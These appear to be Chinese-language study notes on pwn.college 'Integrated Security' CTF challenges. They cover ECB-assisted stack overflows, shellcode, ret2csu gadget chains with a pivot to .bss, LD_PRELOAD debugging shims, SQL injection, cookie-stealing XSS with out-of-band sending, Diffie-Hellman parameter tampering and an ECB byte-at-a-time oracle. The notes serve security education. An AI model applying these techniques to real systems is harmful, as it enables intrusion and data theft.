# 综合安全挑战

截至目前，每个模块都只探讨了单一的概念。然而，你现在已经抵达了通往*橙带*（Orange Belt）道路上的最后一块垫脚石，是时候整合你所学的知识了。本模块中的每一项挑战，都将把两个或多个先前学过的概念整合到一个端到端（end-to-end）的综合性问题中。你能否连接起思维的不同部分，以达成卓越之境？

## 挑战

### ECB制胜（简易）

使用的概念：密码学 + 二进制漏洞利用

挑战程序 dispatch：
```py
assert len(message) <= 16, "Your message is too long!"
plaintext = b"VERIFIED" + struct.pack(b"<Q", len(message)) + message
ciphertext = cipher.encrypt(pad(plaintext, cipher.block_size))
```
- 对输入信息进行 ECB 加密，结构为：（`VERIFIED` + 消息长度 + 消息内容）+ 填充
- 消息长度使用 `Q` 无符号四字

挑战程序 vulnerable-overflow:
```c
// challenge
// 函数头部结构
unsigned char key[16];
    struct
    {
        char header[8];
        unsigned long long length;
        char message[42];
    } plaintext = {0};

// 从标准输入读取到堆
char *ciphertext = malloc(0x1000);
size_t ciphertext_len = read(0, ciphertext, 0x1000);

// 读取第一块16字节（8字节头部+8字节消息长度），验证头部
// 显式关闭了第一块的填充校验，即填充校验默认开启
EVP_CIPHER_CTX_set_padding(ctx, 0);  // disable padding for the first block
EVP_DecryptUpdate(ctx, (char *)&plaintext, &decrypted_len, ciphertext, 16);
assert(memcmp(plaintext.header, "VERIFIED", 8) == 0); 

// 读取第二块的消息内容，此处并未按照栈空间或消息长度头部设置读取字节数，而是按照堆空间
EVP_DecryptUpdate(ctx, plaintext.message, &decrypted_len, ciphertext + 16, ciphertext_len - 16);
```
- 再次，消息长度使用 `unsigned long long` 无符号四字
- `EVP_DecryptUpdate` 推测为读取堆内容到栈
    - 对数据的读取数量限制错误导致栈溢出

可执行文件反汇编：
- `win 地址为 0x4018f7`

```c
// 第一次读取头部信息
00401bb5  lea     rsi, [rbp-0x70 {var_78}] 

// 第二次读取数据
00401cd0  lea     rsi, [rbp-0x70 {var_78}] 
00401cd4  add     rsi {var_68}, 0x10
```
- 除头部外的 0x60（data位置） + 8（初始push）bytes 数据到达返回地址

思路：
1. 由 dispatch 生成的有效头部
2. 由 dispatch 生成的 0x68 bytes 填充。由于每次的限制，需多次生成
3. 由 dispatch 生成的 `win()` 返回地址覆盖栈返回地址
4. 由 dispatch 生成的 padding 对应数据段的填充校验

### ECB制胜（困难）

- 查看反汇编的 `win()` 函数地址

### ECB转Shellcode（简易）

使用的概念：密码学 + 二进制漏洞利用

- 相对之前移除了 `win()` 函数
- 查看“橙带 - 二进制漏洞利用”模块的 shellcode 记录
    - 写汇编代码 - 编译为可执行文件 - 提取指令字段
- 跳转位置为数据段地址，此处使用 `rbp-0x60+0x10`
    - 此处空间固定，使用gdb查看rbp地址`0x7fffffffe550`

- :warning: 反汇编看到的地址与在python中运行pwntool时的栈地址有偏移（地址错位）
    - 参数与环境变量不同导致栈地址变化，此处使用gdb对python调试时得到地址 `550`，而直接运行python得到挑战程序的回显 `5d0`

### ECB转Shellcode（困难）

- 查看反汇编更新跳转地址 `rbp-0x80+0x10`

### CIMG 截图

使用的概念：逆向工程 + 二进制利用


之前模块的cimg结构:
```c
struct cimg_header
{
    char magic_number[4];
    uint16_t version;
    uint8_t width;
    uint8_t height;
    uint32_t remaining_directives;
}

struct cimg_sprite
{
    uint8_t height;
    uint8_t width;
    // uint8_t _pad[6]; 1+1+8字节，然而对齐需增加填充
    pixel_bw_t *data;
};

struct cimg
{
    struct cimg_header header; // 12 bytes
    unsigned num_pixels;        // 4 bytes
    term_pixel_t *framebuffer;  // 8 bytes
    struct cimg_sprite sprites[256];
};
```


h4头部结构:
```c
struct sprite_render_record { // 9 bytes
    uint8_t sprite_id;  // [rsp+0x16]
    uint8_t a;          // [rsp+0x17] 
    uint8_t b;          // [rsp+0x18] 
    uint8_t c;          // [rsp+0x19] 
    uint8_t base_x; //rsp+0x1a
    uint8_t base_y; //rsp+0x1b
    uint8_t block_width_count;         // [rsp+0x1c]
    uint8_t block_height_count;         // [rsp+0x1d]
    uint8_t exclude_ascii_char; //[rsp+0x1e]
};
```

h5头部结构:
```c
rsp+0x5 1bytes sprite_id，根据偏移判断
rsp+0x6 1bytes 宽，宽高根据偏移后的结构判断
rsp+0x7 1bytes 高
rsp+0x8 文件名字符串，open函数的第一个参数
```

- 新增函数 `handle_1337`，其错误信息对于挑战名称 “ERROR: Failed to read &sprite_screenshot_record!”

    `00401512  cmp     cx, 0x539`
    对应的函数代码为  0x539

    h1337 结构
    ```log 
    rsp+0xb {精灵id}
    rsp+0xc {x_base}
    rsp+0xd {y_base}
    rsp+0xe {宽}
    rsp+0xf {高}
    ```

    ```c
    // 读取5个字节到栈 rsp+0xb，5个字段各1byte
    00401ea3  mov     edx, 0x5
    00401ebf  lea     rsi, [rsp+0xb {}]

    
    00401ec9  movzx   r12d, byte [rsp+0xe {宽}]
    00401ecf  lea     rdi, [rsp+0x10 {栈buffer}]
    00401ed6  movzx   r13d, byte [rsp+0xf {高}] 
    00401edc  movzx   r11d, byte [rsp+0xc {x_base}]
    00401ee5  movzx   r10d, byte [rsp+0xd {y_base}]

    00401f2a  movzx   eax, byte [rsp+0xb {精灵id}]
    ```
    
    ```c
    00401f2a  movzx   eax, byte [rsp+0xb {精灵id}] 
    00401f2f  shl     rax, 0x4 
    00401f33  mov     rdi, qword [rax+rbx+0x20] 
    00401f38  test    rdi, rdi 00401f3b  je      0x401f42
    ```
    - rsp+0xb 为精灵数组内的索引（数组元素的结构为16字节，rdi为cimg地址，0x20为头部结构中到精灵数组的指针字段的偏移）



    判断精灵数组的指针是否存在，若存在则free释放

    ```c
    00401f42  mov     ax, word [rsp+0xe {var_aa}] 
    00401f4c  xchg    al, ah
    ```
    - 将0xe 0xf作为word读取后交换高低字节（宽，高）

    ```c
    00401f55  mov     qword [rbx+0x20], rbp {var_a8} 
    00401f59  mov     word [rbx+0x18], ax
    ```
    - 更新精灵数组元素的指针为 rsp+0x10 栈buffer
    - 更新精灵数组元素的（高，宽）字段。于是最终对应： 0xe为宽，0xf为高

    - 在循环中：遍历 宽*高 矩阵，写入栈buffer

构建缓冲区溢出的shellcode: :warning: cimg 将渲染为 0x20 空格
- 编写无 0x00 的汇编代码，提取指令到 shellcode_raw
- 对 shellcode_raw 添加填充与返回地址后到 shellcode_pad 文件
- h5 从 shellcode_pad 文件读取到精灵数组
- h4 复用精灵数组到大画布
- h1337 从大画布读取ascii字符到栈中
    - 栈buffer: rsp+0x10 = 0x7fffffffd4d0
    - 栈buffer到返回地址的距离: 4*8(push) + 0x88 = 0xa8


### CIMG 截图 2

- 移除了 h5 函数，添加 win 函数
- 添加填充字符覆盖返回地址到 win
- 将之前的h5替换为h3即可

h3字段：
- sprite_id、width、height 各1字节
- 宽* 高 个ascii码矩形

win 函数向 rbp 处写入
```c
0040168c  4889ee             mov     rsi, rbp {buf}
0040168f  e86cfbffff         call    read
```

h1337覆盖返回地址时同时覆盖了rbp
```c
0041191f  5b                 pop     rbx {__saved_rbx}
00411920  5d                 pop     rbp {__saved_rbp}
00411921  415c               pop     r12 {__saved_r12}
00411923  415d               pop     r13 {__saved_r13}
00411925  c3                 retn     {__return_addr}
```

然而由于输入字符的约束，无法设置rbp的覆盖值为可写入的地址。
寻找设置了 rbp 的落脚位置，或读取flag的同时未使用 rbp 作为指针的位置

`objdump -d -M intel /challenge/integration-cimg-screenshot-win | grep -nE "win>|mov\s+rbp|lea\s+rbp"`
在反汇编中搜索设置了rbp的代码地址

### Wily 网页服务器

使用的概念：网络安全 + 二进制漏洞利用

- 挑战程序为使用c实现的网络服务器，监听端口80

    其连接处理函数：
    ```c
    #define REQUIRE(x, y) if (!(x)) { \
    write(client_fd, HTTP_ERROR(y), sizeof(HTTP_ERROR(y))-1); \
    write(client_fd, HTTP_ERROR(y), sizeof(HTTP_ERROR(y))-1); \
    return; \
    }

    void handle_connection(int client_fd)
    {
        char request[8192] = { 0 };
        char method[8] = { 0 };
        char version[10] = { 0 };
        char path[256] = { 0 };
        char resolved_path[512] = { 0 };

        read(client_fd, request, 1000);
        sscanf(request, "%7s %255s %9s", method, path, version);

        REQUIRE(strcmp(method, "GET") == 0, 501);
        REQUIRE(strcmp(version, "HTTP/1.1") == 0, 400);
        sprintf(resolved_path, "/challenge/files/%s", path);
        send_file(client_fd, resolved_path);
    }

    void send_file(int client_fd, char *path)
    {
        struct response_t
        {
            char *head;
            char content[8192];
        } response = { 0 };
        response.head = response.content;

        REQUIRE(file_stat.st_size < 8192, 413)

        response.head += read(file_fd, response.head, file_stat.st_size);
        REQUIRE(!strstr(response.content, "pwn.college{"), 403);
    ```
    - 存在路径遍历，但设置路径为 /flag 时匹配内容而返回 403
    - send_file 存在对buffer的长度检测，然而结构体的两个字段共用buffer（指针），导致head+content超过缓冲区
        - 计算头部长度，构建覆盖返回地址的载荷，未发现 win 函数，于是构建shellcode。
        - rbp-0x2010 为结构地址
        
    - 复制源码，并修改或注释掉权限设置。
    `gcc -g -O0 -no-pie -fno-stack-protector  -z execstack -o integration-web-overflow integration-web-overflow.c`
    - 使用与程序匹配的调试级编译，并匹配地址随机、栈保护、栈执行设置  
        - 使用gdb运行修改的本地版本，得到结构地址（包含响应头部） rbp-0x2010 = 0x7fffffffa1a0，content 地址开始于 rbp-0x2010+8 处（指针后） 0x7fffffffa1a8

        0x7fffffffa26b 载荷的实际起始地址
        0x4016c3 <send_file+1117>:   ret
    - 然而复制的修改本地程序得到的固定地址，无法直接使用到挑战程序本体中
        gdb 程序在 main 的 rsp 值：
        - 挑战程序本体 0x7fffffffe5e0
        - 本地复刻程序 0x7fffffffe570

        虽然无法完全使用gdb对挑战程序信息调试，但可进入main开头获得rsp地址，以计算与本地程序的差值，使用此差值即可实现地址覆盖 ———— 栈地址校准

### 水坑攻击

:x: 未完成 :x:

使用的概念：网络安全 + 二进制漏洞利用

注意：此处的服务器响应头部长度相对上一个挑战+4字节

```c
assert(setresgid(65534, 65534, 65534) == 0);
assert(setresuid(65534, 65534, 65534) == 0);
assert(open("/flag", O_RDONLY) < 0);

// setresuid() disables coredumps (for security reasons). This re-enable them.
assert(prctl(PR_SET_DUMPABLE, 1) == 0);
```
- 挑战程序服务器设置权限为 nobody，无法读取flag。
- 覆盖返回地址使服务器崩溃后（崩溃时），再次运行服务器时产生核心转储文件（崩溃后）。
    - 崩溃时挑战程序的nobody身份，无法在hacker的目录下写入core，即使生成，由于权限设置hacker也无法读取。

思路：
覆盖返回地址后，accept客户端连接，read请求，write返回包含cookie头部的请求（客户端拥有回显，或写入到输出）。获取栈空间的shellcode地址受阻，转向工具链。

工具链：
- 设置寄存器（作为函数参数）
- 调用现成函数（PLT/重定位表（GOT）/函数指针）
- 栈迁移（stack pivot）到更大的可控内存

查找工具链：
- `objdump -R /challenge/server | egrep ' read@| write@'`  
    在程序被动态链接时，像 close、accept、read、write 这些来自 libc 的函数地址在程序启动前是未知的，它们被存储在全局偏移表（GOT）中。

    很多 ret2csu 的 “call 段”形如：

    call QWORD PTR [r15+rbx*8]
    它需要你给一个“内存地址 r15”，里面存着函数指针。GOT 表项正好满足：

    write@GOT/read@GOT 里存着动态链接解析后的 write/read 实际地址

- `readelf -S /challenge/server | egrep '\.bss|\.data'`
    查 .bss/.data 等“固定可写内存”（为 staging / pivot 做准备）:

    .bss 是未初始化全局变量区：可写、地址固定（No PIE 时）、空间通常够大

    常用于：
    - 放其他阶段 ROP
    - 放字符串
    - 放 read() 读入的更多 payload（避免受最初文件长度/栈空间限制） 

- `ROPgadget --binary /challenge/server | grep -n "leave ; ret"`  
    ROPgadget：批量搜 gadget（寄存器控制、pivot、ret2csu 辅助）

    区分“干净 gadget”和“脏 gadget”
    - 干净：`leave ; ret` 前面没有别的会崩的副作用
    - 脏：像 `add byte ptr [rax], al ; leave ; ret`  
        这会写内存 `[rax]`，`rax` 不可控时非常容易 Bus error   

- `ret2csu` 的两段:

    - `pop` 段：`ROPgadget --binary /challenge/server | grep -E "pop rbx|pop r12|pop r13|pop r14|pop r15"`  
        一次性从栈里 `pop` 出一组寄存器（包括 `r12/r13/r14/r15` 等）

    
    - `call` 段：`objdump -d -M intel /challenge/server | grep -n "__libc_csu_init" -A80`  
        把 `r12/r13/r14` 搬运到 `edi/rsi/rdx`，再` call [r15+rbx*8]` 

       - `__libc_csu_init` 函数的末尾包含一系列连续的 pop 指令和 mov 指令。这些指令片段可以组合起来，实现对 rdi、rsi、rdx 这三个关键参数寄存器的控制。  


复刻程序构造工具链地址：
- ret2csu - pop 设置被调寄存器
    `objdump -d -M intel server | grep -n "__libc_csu_init" -A80`
    
    ```c
    972-  401faa:   5b                      pop    rbx
    973-  401fab:   5d                      pop    rbp
    974-  401fac:   41 5c                   pop    r12
    975-  401fae:   41 5d                   pop    r13
    976-  401fb0:   41 5e                   pop    r14
    977-  401fb2:   41 5f                   pop    r15
    978-  401fb4:   c3                      ret
    ```
- ret2csu - call 从被调寄存器中设置调用寄存器并调用函数
    `objdump -d -M intel server | grep -n "__libc_csu_init" -A80`

    ```c
    964-  401f90:   4c 89 f2                mov    rdx,r14
    965-  401f93:   4c 89 ee                mov    rsi,r13
    966-  401f96:   44 89 e7                mov    edi,r12d
    967-  401f99:   41 ff 14 df             call   QWORD PTR [r15+rbx*8]
    968-  401f9d:   48 83 c3 01             add    rbx,0x1
    969-  401fa1:   48 39 dd                cmp    rbp,rbx
    970:  401fa4:   75 ea                   jne    401f90 <__libc_csu_init+0x40>
    971-  401fa6:   48 83 c4 08             add    rsp,0x8
    972-  401faa:   5b                      pop    rbx
    973-  401fab:   5d                      pop    rbp
    974-  401fac:   41 5c                   pop    r12
    975-  401fae:   41 5d                   pop    r13
    976-  401fb0:   41 5e                   pop    r14
    977-  401fb2:   41 5f                   pop    r15
    978-  401fb4:   c3                      ret
    ```
- 函数/片段地址
    本地复刻服务器 && 原版服务器：
    ```sh
    objdump -R server | egrep ' read@| write@'
    0000000000403f30 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5
    0000000000403f70 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
    0000000000403f68 R_X86_64_JUMP_SLOT  close@GLIBC_2.2.5
    0000000000403fc8 R_X86_64_JUMP_SLOT  accept@GLIBC_2.2.5

    hacker@integrated-security~the-watering-hole:~$ readelf -S server | egrep '\.bss|\.data'
    [24] .data             PROGBITS         0000000000404000  00003000
    [25] .bss              NOBITS           0000000000404020  00003010

    ROPgadget --binary server | grep -n "pop rbp"
    85:0x000000000040145d : pop rbp ; ret

    ROPgadget --binary server | grep -n "leave ; ret"
    62:0x000000000040154a : leave ; ret

    
    (gdb) x/30gx $rsp
    0x404020 <stdout@@GLIBC_2.2.5>: 0x00007ffff7faf6a0      0x0000000000000000
    0x404030 <stdin@@GLIBC_2.2.5>:  0x00007ffff7fae980      0x0000000000000000
    0x404040 <stderr@@GLIBC_2.2.5>: 0x00007ffff7faf5c0      0x0000000000000000
    0x404050:       0x0000000000000000      0x0000000000000000
    ```
    - bss中的 `stdin/stdout/stderr` 这些不是“文件描述符 0/1/2”，而是 glibc 里的全局变量 `FILE *stdin, *stdout, *stderr`。你的可执行文件如果引用了它们，动态链接器会通过 COPY relocation（拷贝重定位） 在主程序的 `.bss/.data` 里为它们分配槽位，并在启动时把 libc 里的初始值“拷贝”过来，所以你会看到它们正好落在 `.bss` 起始处:
        ```sh
        hacker@integrated-security~the-watering-hole:~$ nm server | egrep 'stdin|stdout|stderr'
        0000000000402000 R _IO_stdin_used
        0000000000404040 B stderr@@GLIBC_2.2.5
        0000000000404030 B stdin@@GLIBC_2.2.5
        0000000000404020 B stdout@@GLIBC_2.2.5
        ```
        使用bss时不应当设置为bss的起始处

概念验证，输出指令码到标准输出（指令地址与原版服务器相同）：
1. ret 跳转地址为 pop 的 `401faa`
2. 设置 `write(1, 0x401fa, 10)` pop：
    函数指针偏移 rbx = 0 无偏移
    csu循环次数 rbp = 1 1次
    参数1 r12 = 1 标准输出
    参数2 r13 = 401faa 读取字节地址
    参数3 r14 = 10 读取字节数量
    函数指针基址 r15 = 403f30 write函数

3. 设置 `write(1, 0x401fa, 10)` mov+call:
    ret地址 r15 = 401f90 write函数
4. gdb调试时，send_file 的返回地址 `break * send_file+1085`
    - 启动gdb后设置环境变量
        `set environment LD_PRELOAD=/home/hacker/preload.so`
    `LD_PRELOAD=./preload.so /home/hacker/server`

在服务器中接受客户端连接、读取头部、发送cookie：
栈溢出空间不足覆盖所有工具链向量，迁移至 .bss 中。从文件或连接描述符中读取至 .bss，然后设置 .bss 为伪栈（此处bss无执行权限）。
迁移至bss伪栈：
1. ret 跳转地址为 pop 的 `401faa`
2. 读取工具链数据到bss（连接描述符或本地文件）
    设置 `read(4, bss, 900)` 
    - pop：
        函数指针偏移 rbx = 0 无偏移
        csu循环次数 rbp = 1 1次
        参数1 r12 = 4 客户端连接描述符
        参数2 r13 = 404020 写入到bss
        参数3 r14 = 900 写入字节数量
        函数指针基址 r15 = 403f70 read函数

    - mov+call:
        ret地址 r15 = 401f90
    
    设置rsp到bss伪栈
    - rsp+0x8 到末尾： 2填充 >> 设置rbp到bss >> 4填充
        (0 = 0)*2
        rbp = 404020 bss地址
        (0 = 0)*4
        ret = 40154a `leave ; ret`地址

    - `leave ; ret` 设置rsp到rbp并跳转到此地址
        `mov rsp, rbp ; pop rbp` 
        注意，此处rsp已经移入bss，于是pop 的填充与ret均应当设置在bss中
        ret = 401faa 伪栈迁移完成，设置rip 到 pop

工具链：
~~1. ret 跳转地址为 pop 的 `401faa`~~
2. 设置 `close(4)`:
    - pop：
        函数指针偏移 rbx = 0 无偏移
        csu循环次数 rbp = 1 1次
        参数1 r12 = 4 关闭当前连接描述符
        参数2 r13 = 0
        参数3 r14 = 0
        函数指针基址 r15 = 403f68 close函数

    - mov+call:
        ret地址 r15 = 401f90
    - rsp+0x8 填充
        0 = 0

4. 设置 `accept(3, null, null)` 
    - pop：
        函数指针偏移 rbx = 0 无偏移
        csu循环次数 rbp = 1 1次
        参数1 r12 = 3 服务器监听描述符
        参数2 r13 = 0 addr 和 addrlen 同时设为 NULL
        参数3 r14 = 0 addr 和 addrlen 同时设为 NULL
        函数指针基址 r15 = 403fc8 accept函数

    - mov+call:
        ret地址 r15 = 401f90
    - rsp+0x8 填充
        0 = 0
4. 设置 `read(4, bss+400, 500)` 
    - pop：
        函数指针偏移 rbx = 0 无偏移
        csu循环次数 rbp = 1 1次
        参数1 r12 = 4 客户端连接描述符
        参数2 r13 = 404020+400 写入到bss
        参数3 r14 = 500 写入字节数量
        函数指针基址 r15 = 403f70 read函数

    - mov+call:
        ret地址 r15 = 401f90
    - rsp+0x8 填充
        0 = 0
4. 设置 `write(1, bss+400, 500)` 
    - pop：
        函数指针偏移 rbx = 0 无偏移
        csu循环次数 rbp = 1 1次
        参数1 r12 = 1 标准输出
        参数2 r13 = 404020+400 从bss读取
        参数3 r14 = 500 读取字节数量
        函数指针基址 r15 = 403f30 write函数
    - mov+call:
        ret地址 r15 = 401f90 


本地复刻程序不拥有原版的工具链与符号，转向复制 /challenge/server 可执行程序后使用 LD_PRELOAD 进行库打桩：
- LD_PRELOAD 概念：
    对动态链接的 ELF（如 dynamically linked），程序运行时会先启动动态链接器 ld-linux，由它来加载依赖库（libc 等）并解析符号（比如 bind, setresuid 这些函数地址）。
    - `LD_PRELOAD=/path/to/x.so` 会告诉动态链接器：先把这个 .so 加载进来
    - 如果这个 .so 里也定义了 bind()，那么程序里对 bind() 的调用会优先命中这个版本（这叫 symbol interposition / 符号劫持）
    - 你在自己的 bind() 里可以：
        - 改参数（把 80 改成 8080）
        - 再去调用“真正的 bind”（通过 dlsym(RTLD_NEXT, "bind") 拿到 libc 里的原始实现）
    - 对于 `__attribute__((constructor))`，会被编译器/链接器把函数地址写进可执行文件的 `.init_array`。
        - 程序启动时，动态链接器按 `.init_array` 里写死的地址 call 过去执行
        - 能做的是：改变它的条件 / 改变它调用到的库函数的行为 / 或 patch 二进制。
            - preload 的库通常先于主程序 constructor 执行（同属动态加载初始化阶段，但顺序上常见是“先库后主程序”）。

    重要限制:
    - 对 setuid/setgid 程序，LD_PRELOAD 通常会被忽略/清理（安全机制）。“拷贝版”（不再是 setuid），所以可以用它做本地调试。
    - 只影响当前进程，不会改磁盘上的二进制。
- 修改内容：
    - `bind(server_fd, ... port 80 ...)`
        把端口 80 改成一个非特权端口（如 8080/18080），避免 EACCES。

    ```c
    int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {

        // 设置与原始函数的参数与返回值类型相同的函数指针
        // dlsym(RTLD_NEXT, "bind") 在库打桩中，于当前的自定义构造库后（原库）查找函数，从而得到原始函数以包装。
        static int (*real_bind)(int, const struct sockaddr*, socklen_t) = 0;
        if (!real_bind) real_bind = dlsym(RTLD_NEXT, "bind");

        // 调用 bind 时，将结构 struct sockaddr_in 转为 struct sockaddr
        // 此处逆向转回以访问端口字段
        struct sockaddr_in tmp = *(const struct sockaddr_in*)addr;

        // 修改原端口 80，到自选端口
        // 填入字段时使用 htons(80) 设置字节顺序，此处使用 ntohs 转回数字后比较
        if (ntohs(tmp.sin_port) == 80) {
            tmp.sin_port = htons(9999);
            return real_bind(sockfd, (struct sockaddr*)&tmp, sizeof(tmp));
        }
        
        // 修改参数后调用原函数
        return real_bind(sockfd, addr, addrlen);
    }
    ```

    - `setresuid/setresgid`
        设置包装函数返回 0，让程序继续跑下去。

    - disable_aslr 构造函数

        分析：
        ```c
        int current = personality(-1);                 // 读当前mask
        if ((current & ADDR_NO_RANDOMIZE) == 0) {  // 从mask中提取flag位，如果“未禁用 ASLR”进入分支
            personality(current | ADDR_NO_RANDOMIZE); // 就把“禁用 ASLR”这个flag位设置到当前mask中
            execve("/proc/self/exe", ...);         // 重新启动，让新 personality 生效
        }
        ```
        导致此程序仅可执行一次。

        构造：
        ```c
        int current = personality(-1);                
        if ((current & ADDR_NO_RANDOMIZE) == 0) {  
            personality(current | ADDR_NO_RANDOMIZE);      
        }
        ```
        只是设置禁用空间随机化这个flag位

- 将c文件打包为共享库
    `gcc -shared -fPIC -ldl -o preload.so preload.c`
    - `-shared`：指示编译器生成共享库。
    - `-fPIC`：生成位置无关代码，这是共享库的硬性要求。
    - `-ldl`：链接 libdl 库，如果你的代码使用了 dlsym，则必须添加此选项。

    避免当前环境的包装函数污染导致的不匹配：
    `env -i PATH=/usr/bin:/bin /usr/bin/gcc -shared -fPIC -ldl -o preload.so preload.c`
    - `env -i PATH=/usr/bin:/bin`：用“干净环境”启动，避免继承可能影响链接的变量。
    - `/usr/bin/gcc`：使用 Ubuntu 的 gcc/ld

- 使用库打桩,命令行中设置 LD_PRELOAD 环境变量后启动目标程序
    `LD_PRELOAD=./preload.so /home/hacker/server`

- 使用gdb调试时，启动gdb后设置环境变量
    `set environment LD_PRELOAD=/home/hacker/preload.so`

### 安全聊天 1

challenge/run 功能分析：
- 创建一个网络
- 将 alice_host 设置为服务器
- 使用聊天服务器的端点 `/register` 创建一批用户
- 模拟登录到 `/login` 后，使用 `/chat/x` 聊天功能
    - Sharon 传递明文 flag 到 Bob.
    - Bob 从 Sharon 接收 flag 后，发送普通文本到 Mallory
    - Mallory 与 Alice 的会话缺失，Alice 将持续等待 Mallory 的会话（一个入口）。
    - Alice 尝试与 Bob 进行 DHE-AES-ECB 加密通信，flag 此加密会话中被传递

challenge/chat-server 分析：
特点：
- SQL注入，多处将用户输入拼接到 SQL 语句中
- HTML/JavaScript注入，对用户输入无转义。
- 浏览器JS可读取cookie，`SESSION_COOKIE_HTTPONLY=False`
- 数据库表
    `users (username TEXT, hashed_password TEXT, admin BOOLEAN)`
    `encrypted_chats (encrypted_username_1 TEXT, encrypted_username_2 TEXT, encrypted_contents TEXT)`
- 加密解密仍为 AES-ECB
    - 把双方用户名加密后排序，作为 encrypted_chats 会话索引键
    - 把聊天内容加密
端点：

- `/register` 注册，保存 hash 后的密码
- `/login` 登录
    仅在 localhost 登录时设置管理员 token
- `/chat/<other_username>` 聊天
    读取 encrypted_chats，服务端解密后把内容塞进 HTML：
- `/user/<username>/modify` 用户修改
    非 admin：只能改自己密码/删除自己
    admin：可改任意用户的 username/password/admin/删除
    GET 页面会把 username 直接放到 HTML 里


思路：
- 聊天与修改端点回显 sql 查询，且存在注入。
- `/chat`将回显解密聊天记录，而此处 “Sharon 传递明文 flag 到 Bob”的会话中包含flag
- 尝试sql注入登录或注册同名账户后，使用 `/chat`端点得到解密会话。但 sharon 的用户名后缀添加了随机字符，需使用sql查询得到名称
    - 在用户修改功能中，使用 limit 与 offset 组合提取用户名
    - sql注入登录其中一个账户
    - 访问与另一个账户进行会话的端点，得到解密会话记录

### 安全聊天 2

此处，在 Bob 与 Mallory 通信后，Sharon 删除了账户
- 可作为 Mallory，在与 Alice 的会话中注入 XSS，已实现带外到 10.0.0.5
- Bob 与 Alice 尝试构建加密的通信中，均使用正则表达式匹配第一条记录。
- 无法控制双方 AES 的秘密指数，但可控制公开秘密基数，从而最终控制计算出的秘密。
    并且此处使用秘密的 `key = dh_s.to_bytes(256, "big")[:16]` 前十六位（高位）作为 ECB 的 key，对于小数字相同（如果设置为0或1则完全可控）。
- 需在控制加密的同时使得双方可继续对话，从而推进事件得到 flag 信息，否则加密或填充错误
- :warning: XSS 注入时，服务器即为 Alice 主机，设置相对路径或 localhost，而不是 10.0.0.1。确保发送内容为 post 表单格式。事件推进拥有几秒间隔，设置一段延迟后再读取最终会话。

思路：
- 登录 Mallory XSS注入 Alice
- 在 Alice 浏览器中发送加密握手消息到 Bob
- 登录 Bob 发送加密握手消息到 Alice
- 作为 Mallory 发送消息推进事件
- Alice 发送加密握手消息到 Bob，收到之前 hacker 的数据计算加密
- Bob 收到多条加密握手信息，使用 hacker 的数据计算加密，发送握手加密握手消息到 Alice，并等待加密后的下一条消息
- Alice 收到 Bob 的加密握手信息
- Alice 与 Bob 的加密通信均使用 hacker 控制的数据，事件继续并完成所有会话
- 登录为 Bob，查看历史加密会话并解密


### 安全聊天 3

此处，在 Bob 与 Alice 的加密通信中，Bob 并未发送 flag。此处唯一出现flag 的位置在 Sharon 传递明文 flag 到 Bob。
- 服务器删除功能将用户名设置为 NULL，并仅在双方均删除账户的时候从数据库删除会话。
```py
if "delete" in request.form:
    db.execute(f"DELETE FROM users WHERE username='{username}'")
    db.execute(f"UPDATE encrypted_chats SET encrypted_username_1=NULL WHERE encrypted_username_1='{encrypted_username}'")
    db.execute(f"UPDATE encrypted_chats SET encrypted_username_2=NULL WHERE encrypted_username_2='{encrypted_username}'")
    db.execute(f"DELETE FROM encrypted_chats WHERE encrypted_username_1 IS NULL AND encrypted_username_2 IS NULL")
```

- 密文块可从SQL注入中查表得到，特征为用户名为 NULL
- 若能够修改删除后的 NULL 到任意用户名（的加密名称），则可登录 Bob 后查看还原的 chat 记录。  
    或将 flag 密文覆盖到其他用户的会话记录中，也可使用 chat 查看解密内容。
- 但无法进行堆叠查询 `;` 以使用 UPDATE 修改 encrypted_chats 表中的内容
- SQLite 的 data-changing CTE 必须是 top-level 语句，也无法对当前 SQL 注入点使用 UPDATE

概念：
无法使用 chat 端点解密密文，尝试对密文进行预言机攻击：
- 预言机依赖 15字节已知+1字节未知
- 目标密文块格式为：`sharon...: The flag is pwn.college{...}.`
- 应用程序拥有修改用户名称的功能，修改时将解密密文后在行首修改匹配字符串。
    ```py
    new_encrypted_contents = encrypt("".join(
                    (line.replace(f"{username}: ", f"{new_username}: ", 1) if line.startswith(f"{username}: ") else line) + "\n"
                    for line in contents.splitlines()
                ).encode()).hex()
    ```            

思路：
- XSS 到 Alice 的会话中新添，提取 Alice 的管理员 Cookie，之后用来修改用户名（将 Cookie发送到chat端点、存入数据库或带外）
- 如之前挑战，劫持加密握手最终得到 Sharon 的随机名称
- Bob 修改名称到 Sharon 的随机名称，此后的所有名称修改将同时修改 flag 明文前缀
    - 此处仅有一个加密用户名为 NULL 的记录，无需提取数据库 id

ECB：
1. 每次1字节，挤入最后一块，使用填充构建仅有1未知字节的块：
    1未知 + 15PKCS填充，1测试+15PKCS填充
2. 控制前缀构建仅有1个未知字节的块：
    15已知 + 1未知， 15已知 + 1测试（不依赖PKCS填充）

此处可控的用户名不可包含不可打印字符，于是PKCS填充不可行，使用 2.
- 使用可变用户名控制块内容：目标密文块与对照测试块
    - 对照测试块使用第二块则可设置用户名为第一块填充+（15~0），来遍历所有16位。
        - 同时对照块需向后偏移一块
- 注意状态传递，每次修改用户名时传递到所有其他位置。若发现连续重复，很可能是状态断掉，尤其是函数调用时。

### 安全聊天 4

- 新增 check-admin-pin 程序
    - 修改用户名时，新增提取表单中的 `admin_pin` 参数，并以标准输入的字符串形式传递到 check pin 程序中，若返回非0则失败
    - check pin 将打开本地文件与标准输入的值进行对比
    - 使用 gets，缓冲区溢出
        - 服务器子进程参数中的 `encoding="latin-1"`，使得对子进程的输出会被按照 Latin-1 编码进行解码。
            - 将构造bytes解码为 `l1` 格式的字符串
        - 栈空间 两个 PUSH + `sub   rsp, 0x88` 
        - 输入位置 `rsp+0x40`
        - 填充到返回地址 = 0x88 + 2*8 - 0x40
        - 授权地址 0x401257

### 安全聊天 5

- 移除了浏览器JS可读取cookie 的设置。无法使用 XSS 读取 Alice Cookie 从而作为管理员修改用户名。
- XSS 在 Alice 的浏览器里可持续执行
    - 同源，心跳到chat端点：
        alice 浏览器每 5秒检测与 mallory的chat页面 etag 以探测是否内容变化，如变化则重新加载。
        - 若设置 `setInterval` 则被销毁
        - 若 script 无防止同页面、重新加载的重复设置（如使用 `localStorage` 保存状态信息），则多次重复执行。
    - 带外，心跳到10.0.0.5（用 nc 将导致挂起，使用服务器库即可）：
        在事件推进后的 js 心跳检测可持续运行而不会触发由于chat etag 变化导致的刷新

